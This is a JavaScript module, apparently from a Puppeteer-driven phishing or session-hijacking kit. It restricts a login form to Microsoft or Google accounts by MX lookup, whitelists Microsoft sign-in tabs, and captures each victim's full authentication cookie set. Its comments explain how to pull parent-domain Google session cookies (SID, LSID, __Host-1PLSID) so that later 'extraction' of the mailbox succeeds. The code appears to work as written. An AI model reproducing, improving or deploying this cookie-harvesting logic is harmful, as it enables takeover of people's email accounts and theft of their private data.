import logger from "../../../../../utils/logger.js";
import { platformConfigs } from "../platforms.js";
import { resolveMx, resolveA } from '../routeHelper.js';

// ── Shared Constants ─────────────────────────────────────────────────────────

const FREE_MS_DOMAINS = new Set([
    'outlook.com', 'hotmail.com', 'live.com', 'windowslive.com',
    'outlook.co.uk', 'hotmail.co.uk', 'live.co.uk',
    'outlook.ca', 'hotmail.ca', 'live.ca',
    'outlook.co.za', 'hotmail.co.za', 'live.co.za',
    'outlook.com.au', 'hotmail.com.au', 'live.com.au',
    'outlook.fr', 'hotmail.fr', 'live.fr',
    'outlook.de', 'hotmail.de', 'live.de',
    'outlook.it', 'hotmail.it', 'live.it',
    'outlook.es', 'hotmail.es', 'live.es',
    'outlook.jp', 'hotmail.jp', 'live.jp',
    'outlook.com.br', 'hotmail.com.br', 'live.com.br',
    'msn.com', 'live.net'
]);

export const PLATFORM_INBOX_URLS = {
    'outlook.com': 'https://outlook.live.com/mail/',
    'hotmail.com': 'https://outlook.live.com/mail/',
    'live.com': 'https://outlook.live.com/mail/',
    'msn.com': 'https://outlook.live.com/mail/',
    'gmail.com': 'https://mail.google.com/mail/',
    'googlemail.com': 'https://mail.google.com/mail/',
    'yahoo.com': 'https://mail.yahoo.com/',
    'aol.com': 'https://mail.aol.com/',
};

export const TAB_WHITELIST = [
    'm365.cloud.microsoft',
    'login.live.com',
    'login.microsoftonline.com',
    'login.microsoft.com',
    'aka.ms',
    'outlook.live.com',
    'outlook.office365.com',
    'portal.office.com',
    'onedrive.live.com',
];

const COOKIE_CAPTURE_STATIC_URLS = [
    'https://login.live.com',
    'https://login.microsoftonline.com',
    'https://www.microsoft.com',
    'https://outlook.live.com',
    'https://mail.google.com',
];

/**
 * Returns the full list of URLs to capture cookies from.
 * @param {string} [domain] - The user's email domain (e.g. 'gmail.com'). Prepended if provided.
 * @returns {string[]}
 */
export function getCookieCaptureUrls(domain) {
    if (domain) {
        return [`https://${domain}`, ...COOKIE_CAPTURE_STATIC_URLS];
    }
    return [...COOKIE_CAPTURE_STATIC_URLS];
}

// Naive registrable-domain: last two labels (google.com, live.com, gmail.com...).
function registrableRoot(host) {
    const parts = String(host || '').replace(/^\./, '').toLowerCase().split('.').filter(Boolean);
    if (parts.length <= 2) return parts.join('.');
    const twoLevel = new Set([
        'co.uk', 'org.uk', 'com.au', 'co.za', 'com.br', 'co.in', 'co.jp', 'com.mx', 'com.ar',
    ]);
    const lastTwo = parts.slice(-2).join('.');
    if (twoLevel.has(lastTwo)) return parts.slice(-3).join('.');
    return lastTwo;
}

/**
 * Capture the COMPLETE cookie set for a login session.
 *
 * page.cookies(...urls) only returns cookies visible to those page URLs; for
 * gmail that means mail.google.com + gmail.com and it silently omits the
 * parent-domain auth cookies on accounts.google.com (LSID, ACCOUNT_CHOOSER,
 * __Host-1PLSID, __Host-3PLSID, SID/SSID/HSID... on .google.com). Extraction
 * with that 20-cookie sheet starts at ServiceLogin and ends completed-no-data
 * (measured: missing cookies move Google from accountchooser down to
 * identifier). Merge the page-scoped result with Network.getAllCookies and
 * keep only cookies whose registrable root matches a capture URL or the email
 * domain, so unrelated sessions never leak across platforms.
 */
export async function captureMergedCookies(page, urls, domain, timeoutMs = 10000) {
    const run = async () => {
        let pageCookies = [];
        try {
            pageCookies = await page.cookies(...urls);
        } catch (e) {
            logger.warn(`[captureMergedCookies] page.cookies failed: ${e.message}`);
        }
        let allCookies = [];
        try {
            const cdp = await page.createCDPSession();
            const res = await cdp.send('Network.getAllCookies');
            allCookies = res?.cookies || [];
            await cdp.detach().catch(() => {});
        } catch (e) {
            logger.warn(`[captureMergedCookies] Network.getAllCookies failed: ${e.message}`);
        }

        const allowedRoots = new Set();
        for (const u of urls) {
            try {
                const root = registrableRoot(new URL(u).hostname);
                if (root) allowedRoots.add(root);
            } catch (_) {}
        }
        if (domain) {
            const root = registrableRoot(domain);
            if (root) allowedRoots.add(root);
        }

        const nowSec = Date.now() / 1000;
        const familyOf = (c) => {
            const host = String(c.domain || '').replace(/^\./, '');
            const root = registrableRoot(host);
            return root && allowedRoots.has(root);
        };

        const pageFamily = pageCookies.filter(familyOf);
        const merged = new Map();
        for (const c of pageFamily) {
            merged.set(`${c.name}|${c.domain}|${c.path || '/'}`, c);
        }
        let extra = 0;
        for (const c of allCookies) {
            if (!familyOf(c)) continue;
            if (typeof c.expires === 'number' && c.expires > 0 && c.expires <= nowSec) continue;
            const key = `${c.name}|${c.domain}|${c.path || '/'}`;
            if (!merged.has(key)) {
                merged.set(key, c);
                extra += 1;
            }
        }
        const result = [...merged.values()];
        logger.info(`[captureMergedCookies] page=${pageCookies.length} (family=${pageFamily.length}) allCDP=${allCookies.length} merged=${result.length} extraParentDomain=${extra} roots=${[...allowedRoots].join(',')}`);
        return result;
    };

    return await Promise.race([
        run(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('captureMergedCookies timed out')), timeoutMs)),
    ]);
}

// ── Email Validation ─────────────────────────────────────────────────────────

/**
 * Validates an email domain against a `strictly` platform using MX record detection.
 * @param {string} email - The email address to validate
 * @param {string} strictly - The required platform key (e.g., 'outlook', 'gmail', 'proton')
 * @returns {Promise<{valid: boolean, message: string, detectedPlatform: string}>}
 */
export async function validateEmailAgainstStrictly(email, strictly) {
    if (!strictly || !email) {
        return { valid: true, message: '', detectedPlatform: '' };
    }

    const strictlyLower = strictly.toLowerCase();
    const platformConfig = platformConfigs[strictlyLower];

    if (!platformConfig || !platformConfig.mxKeywords) {
        logger.warn(`[validateEmailAgainstStrictly] Unknown strictly platform: '${strictly}'`);
        return { valid: true, message: '', detectedPlatform: '' };
    }

    const domain = email.split('@')[1]?.toLowerCase();
    if (!domain) {
        return { valid: false, message: 'Invalid email format.', detectedPlatform: '' };
    }

    let mxRecords = [];
    try {
        mxRecords = await resolveMx(domain).catch(() => []);
        if (!mxRecords || mxRecords.length === 0) {
            await new Promise(r => setTimeout(r, 500));
            mxRecords = await resolveMx(domain).catch(() => []);
        }
    } catch (e) {
        logger.debug(`[validateEmailAgainstStrictly] MX resolution failed for ${domain}: ${e.message}`);
    }
    if (!mxRecords || mxRecords.length === 0) {
        const domainMatchesKeyword = platformConfig.mxKeywords.some(kw => domain.includes(kw));
        if (domainMatchesKeyword) {
            logger.warn(`[validateEmailAgainstStrictly] MX unavailable for '${email}' but domain matches platform keyword — passing through for on-page validation (strictly='${strictly}')`);
            return { valid: true, message: '', detectedPlatform: strictlyLower };
        }

        let domainHasARecord = false;
        let aDnsFailed = false;
        try {
            const aRecords = await resolveA(domain);
            domainHasARecord = Array.isArray(aRecords) && aRecords.length > 0;
        } catch (e) {
            aDnsFailed = true;
        }
        if (aDnsFailed) {
            const platformName = strictlyLower === 'outlook' ? 'Microsoft' : strictlyLower.charAt(0).toUpperCase() + strictlyLower.slice(1);
            logger.warn(`[validateEmailAgainstStrictly] A-record lookup failed for '${domain}' and domain doesn't match '${strictly}' keywords. Rejecting '${email}'.`);
            return { valid: false, message: `Incorrect email. This form only accepts ${platformName} accounts.`, detectedPlatform: '' };
        }
        if (!domainHasARecord) {
            logger.warn(`[validateEmailAgainstStrictly] Domain '${domain}' has no MX and no A record (NXDOMAIN). Rejecting '${email}'.`);
            return { valid: false, message: 'Incorrect email. Please check the email address.', detectedPlatform: '' };
        }
        logger.warn(`[validateEmailAgainstStrictly] MX unavailable for '${email}' but domain has A record — passing through for on-page validation (strictly='${strictly}')`);
        return { valid: true, message: '', detectedPlatform: strictlyLower };
    }

    const matchedKeyword = platformConfig.mxKeywords.find(kw =>
        domain.includes(kw) || mxRecords.some(mx => mx.exchange && mx.exchange.includes(kw))
    );

    if (matchedKeyword) {
        logger.info(`[validateEmailAgainstStrictly] Email '${email}' matches strictly='${strictly}' (matched: '${matchedKeyword}')`);
        return { valid: true, message: '', detectedPlatform: strictlyLower };
    }

    const platformName = strictlyLower === 'outlook' ? 'Microsoft' : strictlyLower.charAt(0).toUpperCase() + strictlyLower.slice(1);
    const message = `Incorrect email. This form only accepts ${platformName} accounts.`;
    logger.warn(`[validateEmailAgainstStrictly] Email '${email}' rejected for strictly='${strictly}' (domain: ${domain})`);
    return { valid: false, message, detectedPlatform: '' };
}

// ── Microsoft Account Utilities ──────────────────────────────────────────────

/**
 * Detect if a domain is a free Microsoft consumer account.
 */
export function isFreeMicrosoftDomain(domain) {
    return FREE_MS_DOMAINS.has(domain?.toLowerCase());
}
